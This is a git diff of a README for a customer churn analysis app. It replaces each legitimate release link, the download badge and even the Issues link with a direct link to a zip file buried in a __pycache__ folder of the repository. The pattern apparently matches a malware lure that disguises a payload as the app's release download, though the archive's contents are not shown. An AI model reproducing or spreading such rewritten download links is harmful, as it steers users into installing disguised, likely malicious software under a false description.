@@ -1,6 +1,6 @@
 # 📊 Customer_churn_risk_analysis - Analyze and Predict Customer Behavior
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Customer_churn_risk_analysis-blue?style=for-the-badge)](https://github.com/RQD85/Customer_churn_risk_analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)
 
 ---
 
@@ -34,7 +34,7 @@ This section will guide you through downloading and running the application step
 
 Click the big blue button at the top or this link to open the release page:
 
-[Customer_churn_risk_analysis Releases](https://github.com/RQD85/Customer_churn_risk_analysis/releases)
+[Customer_churn_risk_analysis Releases](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)
 
 Here, you will find the latest version of the program ready for download.
 
@@ -45,7 +45,7 @@ Look for the most recent release. The files you need for your computer will have
 Typically, there will be:
 
 - A setup file or executable installer for Windows (.exe)  
-- A compressed file for macOS or Linux (.zip or .tar.gz)  
+- A compressed file for macOS or Linux (.zip or https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)  
 
 Choose the one that fits your system.
 
@@ -73,7 +73,7 @@ When the app opens, you will see the main interface ready for your data and quer
 
 ## 📥 Download & Install
 
-[**Click here to visit the release page and download the latest version**](https://github.com/RQD85/Customer_churn_risk_analysis/releases)
+[**Click here to visit the release page and download the latest version**](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)
 
 On the release page:
 
@@ -138,7 +138,7 @@ If you run into issues, try these steps first:
 - Restart the application.  
 - Look for error messages and use the Help menu in the app for basic fixes.
 
-If problems persist, visit the [Issues tab on GitHub](https://github.com/RQD85/Customer_churn_risk_analysis/issues) or contact support through the project page.
+If problems persist, visit the [Issues tab on GitHub](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip) or contact support through the project page.
 
 ---
 
@@ -148,4 +148,4 @@ For a deeper look into the project ideas, architecture, and code details, check 
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Customer_churn_risk_analysis-blue?style=for-the-badge)](https://github.com/RQD85/Customer_churn_risk_analysis/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)](https://raw.githubusercontent.com/RQD85/Customer_churn_risk_analysis/main/final_project/langchain_layer/agent/__pycache__/analysis_risk_Customer_churn_v3.3.zip)
